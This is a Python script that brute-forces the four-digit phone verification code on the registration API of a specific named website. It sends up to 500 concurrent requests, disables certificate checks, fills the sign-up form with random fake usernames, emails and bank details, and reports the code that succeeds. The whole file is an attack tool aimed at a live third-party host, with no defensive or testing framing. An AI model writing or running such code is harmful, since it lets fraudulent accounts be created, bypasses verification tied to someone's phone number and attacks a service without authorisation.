import asyncio, httpx, json, random, time, sys
BASE="https://ofa1777.ofa377.net/api"
H={"Content-Type":"application/json","Origin":"https://ofa1777.ofa377.net","Referer":"https://ofa1777.ofa377.net/"}
def full_codes():
    # 4-digit: padded 0000-9999 and plain 1000-9999 (dedup by string)
    c=[str(x).zfill(4) for x in range(0,10000)]
    c+=[str(x) for x in range(1000,10000)]
    c=list(dict.fromkeys(c))
    return c
async def main():
    phone=sys.argv[1]; offset=int(sys.argv[2]); n=int(sys.argv[3])
    codes=full_codes()[offset:offset+n]
    async with httpx.AsyncClient(verify=False,timeout=20,limits=httpx.Limits(max_connections=600,max_keepalive_connections=600)) as c:
        t0=time.time(); done=0
        sem=asyncio.Semaphore(500)
        async def one(code):
            nonlocal done
            async with sem:
                d={"bank_account":"1","bank_code":"CMB","bank_currency":"TWD","bank_name":"T","email":"e%d@x.com"%random.randint(1,10**9),"line":"l","name":"T","password":"Passw0rd!123","phone_number":phone,"refer_code":"","username":"u%d"%random.randint(10**6,10**7),"verify_code":code}
                rr=await c.post(BASE+"/v2/register/",data=json.dumps(d),headers=H)
                try: b=rr.json()
                except: return
                done+=1
                if b.get("code") in (200,201) or b.get("error_code")!="4405":
                    print("HIT",code,rr.status_code,json.dumps(b)[:600],flush=True)
        tasks=[asyncio.create_task(one(x)) for x in codes]
        for t in asyncio.as_completed(tasks):
            await t
        print("SLICE off=%d n=%d done=%d elapsed=%.1fs"%(offset,len(codes),done,time.time()-t0),flush=True)
asyncio.run(main())
